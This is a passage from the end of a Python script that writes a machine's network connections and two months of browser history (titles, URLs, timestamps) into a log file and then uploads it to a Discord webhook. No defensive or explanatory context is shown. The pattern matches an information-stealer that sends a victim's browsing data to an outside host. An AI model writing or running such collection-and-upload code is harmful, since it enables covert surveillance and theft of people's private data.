    f.write(f"{network_connections}\n")

    f.write("=== Browser History (Last 2 Months) ===\n")
    for entry in browser_history:
        f.write(f"Title: {entry['title']}\n")
        f.write(f"URL: {entry['url']}\n")
        f.write(f"Timestamp: {entry['timestamp']}\n\n")

# Send log file to Discord webhook
send_to_discord_with_file(log_file_path)


if __name__ == "__main__":
    main_menu()
